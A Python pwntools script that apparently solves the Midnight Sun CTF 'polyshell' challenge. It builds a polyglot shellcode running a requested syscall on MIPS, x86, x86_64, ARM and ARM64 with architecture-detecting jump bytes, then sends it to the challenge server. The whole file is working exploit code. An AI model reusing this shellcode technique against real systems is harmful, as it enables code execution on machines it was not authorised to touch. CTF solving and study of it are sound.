#!/usr/bin/env python
from pwn import *

def toint(s):
    return int(s[::-1].encode('hex'), 16)

def mips():
    payload = shellcraft.mips.pushstr(arg2) + '\n'
    payload += 'li $v0, %#x\n' % sysnum
    payload += 'li $a0, %#x\n' % arg1
    payload += 'move $a1, $sp\n'
    payload += 'syscall\n'
    return asm(payload, arch='mips')

def x86():
    return asm('''
        mov eax, %d
        mov ebx, %d
        push %d
        push %d
        mov ecx, esp
        int 0x80
    ''' % (sysnum, arg1, toint(arg2[4:]), toint(arg2[:4])), arch='i386')

def x86_64():
    return asm('''
        mov rax, %d
        push rax
        mov rax, %d
        mov rdi, %d
        mov rsi, rsp
        syscall
    ''' % (toint(arg2), sysnum, arg1), arch='amd64')

def arm():
    return asm('''
        ldr r7, =%d
        ldr r0, =%d
        ldr r1, =%d
        push {r1}
        ldr r1, =%d
        push {r1}
        mov r1, sp
        swi 0
    ''' % (sysnum, arg1, toint(arg2[4:]), toint(arg2[:4])), arch='arm')

def arm64():
    payload = shellcraft.aarch64.pushstr(arg2) + '\n'
    payload += 'mov x1, sp\n'
    payload += 'mov x0, #{}\n'.format(arg1)
    payload += 'mov x8, #{}\n'.format(sysnum)
    payload += 'svc #0\n'
    return asm(payload, arch="aarch64")

s = remote('polyshell-01.play.midnightsunctf.se', 30000)

s.recvuntil('number: ')
sysnum = int(s.recvline(False))
print hex(sysnum)
s.recvuntil('1: ')
arg1 = int(s.recvline(False))
print hex(arg1)
s.recvuntil('string "')
arg2 = s.recvuntil('"')[:-1]
print arg2
arg2 = arg2.ljust(8, '\0')

shellcode = ''
# x86, x86_64 <-> arm, arm64, mips
shellcode += '\xeb\x3a\x02\x32'
# arm <-> arm64, mips
shellcode += '\x1b\x00\x00\x3a'
# arm64 <-> mips
shellcode += '\x26\x00\x00\x14'

shellcode += mips()

# x86 <-> x86_64
shellcode += '\x31\xc0\x40\x90\x74\x15'

shellcode += x86()
shellcode += x86_64()
shellcode = shellcode.ljust((len(shellcode) + 3) / 4 * 4, '\0')
shellcode += arm()
shellcode += arm64()

s.send(shellcode.encode('hex'))
s.interactive()
